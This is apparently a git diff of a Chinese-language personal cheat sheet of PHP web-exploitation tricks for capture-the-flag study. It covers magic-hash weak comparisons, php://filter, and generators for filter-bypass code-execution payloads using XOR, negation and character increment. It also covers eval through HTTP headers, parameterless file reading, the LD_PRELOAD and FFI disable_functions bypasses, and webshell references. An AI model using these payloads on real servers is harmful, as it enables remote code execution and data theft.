@@ -1,6 +1,6 @@
 # PHP积累
 
-## php 三种写法
+## PHP 三种写法
 
 ```
 <? echo ("这是一个 PHP 语言的嵌入范例\n"); ?>
@@ -12,20 +12,26 @@ echo ("这是类似 JavaScript 及 VBScript 语法
 <% echo ("这是类似 ASP 嵌入语法的 PHP 范例"); %>
 ```
 
-php://filter简单理解：
+## PHP中的弱类型比较
 
-php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；
+以下值在MD5加密以0E开头：
 
-使用不同的参数可以达到不同的目的和效果：
+```
+QNKCDZO
+240610708
+S878926199a
+s155964671a
+s214587387a
+```
 
-| 名称                      | 描述                                                         | 备注 |
-| ------------------------- | ------------------------------------------------------------ | ---- |
-| resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流                                   | 必选 |
-| read=<读链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符"\|"分割               | 可选 |
-| write=<写链的筛选列表>    | 可以设定一个或多个过滤器名称，以管道符"\|“分割               | 可选 |
-| <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |      |
+以下值在sha1加密之后以0E开头：
 
-> Tips： read 和write 里 可以塞垃圾字符
+```
+sha1('aaroZmOk')
+sha1('aaK1STfy')
+sha1('aaO8zKZF')
+sha1('aa3OFF9m')
+```
 
 ## 反序列化魔术方法
 
@@ -124,39 +130,33 @@ O:4:"Name":3:{s:14:"\0Name\0username";s:5:"admin";s:14:"\0Name\0password";i:100;
 - path部分以``///``开头返回``bool(false)``
 
 
-## get_defined_vars()
-    获取文件中全部变量，包括include
+## 协议相关
 
-## 函数名取反绕过
 
-## data://协议 php://input ...
+- ``php://filter``简单理解：
 
-## 无参数读文件
+    php://filter 是php中独有的一个协议，可以作为一个中间流来处理其他流，可以进行任意文件的读取；根据名字，filter，可以很容易想到这个协议可以用来过滤一些东西；
 
-过滤条件
-```php
-preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
-';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['exp'])
-```
+    使用不同的参数可以达到不同的目的和效果：
 
-利用``current(localeconv()) pos(localeconv()) === .``
+    | 名称                      | 描述                                                         | 备注 |
+    | ------------------------- | ------------------------------------------------------------ | ---- |
+    | resource=<要过滤的数据流> | 指定了你要筛选过滤的数据流                                   | 必选 |
+    | read=<读链的筛选列表>     | 可以设定一个或多个过滤器名称，以管道符"\|"分割               | 可选 |
+    | write=<写链的筛选列表>    | 可以设定一个或多个过滤器名称，以管道符"\|“分割               | 可选 |
+    | <；两个链的筛选列表>      | 任何没有以 read= 或 write= 作前缀 的筛选器列表会视情况应用于读或写链。 |      |
 
-POC:
+    > Tips： read 和write 里 可以塞垃圾字符
 
-```php
-show_source(array_rand(array_flip(scandir(current(localeconv()))))); #随机当前读目录下文件
-chdir(next(scandir(pos(localeconv()) #chdir(next(scandir(pos(localeconv()
-```
+- ``php://input``
 
-```
-echo(readfile(end(scandir())))))));
-```
+- ``data://``
 
-### 参考资料
+## RCE
 
-https://www.cnblogs.com/wangtanzhi/p/12311239.html
+利用字符串函数名执行特性 
 
-## 利用字符串函数名执行特性rce
+### 异或
 
 ```python
 payload="phpinfo"
@@ -179,8 +179,20 @@ ret=reth+"^"+rett
 print ret
 ```
 
-EX:
-无数字字母
+### 取反
+
+```php
+<?php
+$str = 'phpinfo';
+$str = str_split($str);
+$flag='';
+foreach ($str as  $value) {
+    $flag.=~$value;
+}
+echo "(~".urlencode($flag).")();";
+```
+
+### 字符自增
 
 ```php
 <?=[$_=[],
@@ -279,6 +291,136 @@ $_["__"]($_["_"])]?>//$_POST["__"]($_POST["_"])
 ```
 
 还可以用 ``<?=?> 替代分号逗号
+
+### “数字”拼接
+
+>  PHP 中，将两个数字使用.拼接，会当做字符串来处理，返回的也是一个字符串。例如：(1).(2)出来的就是字符串"12"，然后可以用{}来代替[]来取单个字符。
+
+
+```php
+$char = '1234567890-INFAH@+*%$()"!%meogiakcfhvwbnq_';
+for($i = 0; $i < strlen($char); $i++){
+    for($j = 0; $j < strlen($char); $j++){
+        echo($char[$i] .'&' .$char[$j] . ' '. ($char[$i] & $char[$j]));
+        echo("<br>");
+        echo($char[$i] .'|' .$char[$j] . ' '. ($char[$i] | $char[$j]));
+        echo("<br>");
+    }
+}
+```
+
+sissel师傅写的脚本
+
+```php
+<?php
+$old_list = 'INFA0123456789';
+$new_list = $old_list;
+
+$result = array(
+    "I"=>"((1/0).(0)){0}",
+    "N"=>"((1/0).(0)){1}",
+    "F"=>"((1/0).(0)){2}",
+    "A"=>"((0/0).(0)){1}",
+    "0"=>"((0).(0)){0}",
+    "1"=>"((1).(0)){0}",
+    "2"=>"((2).(0)){0}",
+    "3"=>"((3).(0)){0}",
+    "4"=>"((4).(0)){0}",
+    "5"=>"((5).(0)){0}",
+    "6"=>"((6).(0)){0}",
+    "7"=>"((7).(0)){0}",
+    "8"=>"((8).(0)){0}",
+    "9"=>"((9).(0)){0}",
+);
+
+while(true){
+    for($i = 0; $i < strlen($old_list); $i++){
+        for($j = 0; $j < strlen($old_list); $j++){
+            $tmp = ($old_list[$i]) & ($old_list[$j]);
+            if(! isset($result[$tmp])){
+                $result[$tmp] = "(".$result[$old_list[$i]].")&(".$result[$old_list[$j]].")";
+                $new_list .= $tmp;
+            } 
+
+            $tmp = $old_list[$i] | $old_list[$j];
+            if(! isset($result[$tmp])){
+                $result[$tmp] = "(".$result[$old_list[$i]].")|(".$result[$old_list[$j]].")";
+                $new_list .= $tmp;
+            } 
+        }
+    }
+
+    if($new_list == $old_list)
+        break;
+    $old_list = $new_list;
+}
+//var_dump($result);
+//var_dump($old_list);
+
+function gen($op){
+    global $result;
+    $final = array();
+    for($i = 0; $i < strlen($op); $i++){
+        if(!array_key_exists($op[$i],$result)){
+            $final[]=("(".$result[strtoupper($op[$i])].")");
+        }
+        else $final[]=("(".$result[$op[$i]].")");
+    }
+    //var_dump($final);
+    return "(".implode(".",$final).")";
+}
+
+$payload = gen("phpinfo").gen("").";";
+
+echo $payload;
+
+eval($payload);
+```
+
+有些字符可能无法利用``&|``生成，可利用php忽略大小写的特性绕过
+
+#### 参考资料
+
+RoarCTF Web writeup https://github.red/roarctf-web-writeup/
+
+### 无参数读文件
+
+过滤条件
+```php
+preg_replace('/[a-z,_]+\((?R)?\)/', NULL, $_GET['exp'])
+';' === preg_replace('/[^\W]+\((?R)?\)/', '', $_GET['exp'])
+```
+
+利用``current(localeconv()) pos(localeconv()) === .``
+
+POC:
+
+```php
+show_source(array_rand(array_flip(scandir(current(localeconv()))))); #随机当前读目录下文件
+chdir(next(scandir(pos(localeconv()) #chdir(next(scandir(pos(localeconv()
+```
+
+```
+echo(readfile(end(scandir())))))));
+```
+
+#### 参考资料
+
+https://www.cnblogs.com/wangtanzhi/p/12311239.html
+
+### 一些有用的函数和调用
+
+- ``get_defined_vars()``
+  
+    获取文件中全部变量，包括include
+
+- ``eval(end(getallheaders()))``
+  
+    利用``HTTP``最后的一个``header``传参
+
+- ``eval(getallheaders(){'a'})``
+
+    利用``HTTP``名为``a``的``header``传参
 
 ### 参考资料
 
@@ -451,10 +593,39 @@ if ($res === TRUE) {
 
 ### LD_PRELOAD
 
+原理：
+
+PHP 的 ``putenv()``函数，设定 ``LD_PRELOAD(环境变量)`` 为 ``hack.so``。
+
+利用 PHP 的 ``mail()``函数，``mail()`` 内部启动新进程 ``/usr/sbin/sendmail``，因为上一步 ``LD_PRELOAD``的作用，``sendmail`` 调用的``void()``函数 被优先级更好的 ``hack.so`` 中的同名 ``getuid()``函数所劫持。
+
 #### Exp
 
 https://github.com/ianxtianxt/bypass_disablefunc_via_LD_PRELOAD
 
 ### php 7.4 FFI
 
+
+根据官方文档``FFI``是可以直接调用系统函数的
+
+比如这样
+
+```php
+<?php
+$ffi = FFI::cdef("int system(const char *command);");
+$ffi->system("id > /tmp/eki");
+echo file_get_contents("/tmp/eki");
+@unlink("/tmp/eki");
+```
+
+**但是``FFI API``仅能适用于预加载文件**
+
 ## rand() 安全性问题 
+
+
+## webshell
+
+
+### 参考资料
+
+https://www.smi1e.top/php-webshell%e6%a3%80%e6%b5%8b%e4%b8%8e%e7%bb%95%e8%bf%87/
